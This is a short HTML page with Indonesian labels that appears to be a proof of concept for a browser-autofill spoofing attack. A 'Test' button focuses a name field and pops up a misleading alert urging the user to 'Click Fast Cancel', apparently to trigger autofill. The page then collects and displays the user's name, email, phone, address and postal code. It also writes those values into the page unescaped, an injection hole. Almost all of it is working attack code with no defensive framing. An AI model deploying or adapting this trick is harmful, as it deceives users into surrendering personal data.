<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>


  <style>
    body {
      font-family: sans-serif;
      max-width: 500px;
      margin: 40px auto;
      padding: 0 16px;
    }

    .input {
     position: absolute;
     left: -9999px;
    }
    
    #outputBox {
      margin-top: 20px;
      padding: 12px;
      border: 1px solid #ccc;
      border-radius: 6px;
      background: #f7f7f7;
      display: none;
    }

    .row {
      display: flex;
      gap: 10px;
      margin: 4px 0;
    }

    .key {
      width: 120px;
      color: #666;
    }

    .val {
      font-weight: 500;
      color: #111;
    }
  </style>
</head>

<body>

  <button onclick="spoof()">Test</button>

  <input type="text" id="groupOneElem" autocomplete="name" placeholder="Nama">
  <input type="email" id="f-email" autocomplete="email" placeholder="Email">
  <input type="tel" id="f-tel" autocomplete="tel" placeholder="Telepon">
  <input type="text" id="f-addr1" autocomplete="address-line1" placeholder="Alamat 1">
  <input type="text" id="f-addr2" autocomplete="address-line2" placeholder="Alamat 2">
  <input type="text" id="f-city" autocomplete="address-level2" placeholder="Kota">
  <input type="text" id="f-state" autocomplete="address-level1" placeholder="Provinsi">
  <input type="text" id="f-country" autocomplete="country-name" placeholder="Negara">
  <input type="text" id="f-postal" autocomplete="postal-code" placeholder="Kode Pos">

  <div id="outputBox">
    <h3>Live Output</h3>
    <div id="pii-rows"></div>
  </div>

  <script>
    const fields = [
      { id: 'groupOneElem', label: 'Nama' },
      { id: 'f-email',      label: 'Email' },
      { id: 'f-tel',        label: 'Telepon' },
      { id: 'f-addr1',      label: 'Alamat 1' },
      { id: 'f-addr2',      label: 'Alamat 2' },
      { id: 'f-city',       label: 'Kota' },
      { id: 'f-state',      label: 'Provinsi' },
      { id: 'f-country',    label: 'Negara' },
      { id: 'f-postal',     label: 'Kode Pos' },
    ];

    function render() {
      const filled = fields.filter(f => {
        const el = document.getElementById(f.id);
        return el && el.value.trim() !== '';
      });

      if (filled.length === 0) {
        document.getElementById('outputBox').style.display = 'none';
        return;
      }

      document.getElementById('outputBox').style.display = 'block';

      document.getElementById('pii-rows').innerHTML = filled.map(f => {
        const val = document.getElementById(f.id).value;
        return `
          <div class="row">
            <div class="key">${f.label}</div>
            <div class="val">${val}</div>
          </div>
        `;
      }).join('');
    }

    fields.forEach(f => {
      const el = document.getElementById(f.id);
      if (!el) return;
      el.addEventListener('input', render);
    });

    function spoof() {
      setTimeout(() => {
        alert("Click Fast Cancel.............................................................................................................................................................................................................");
      }, 100);

      document.getElementById('groupOneElem').focus();
    }
  </script>

</body>
</html>
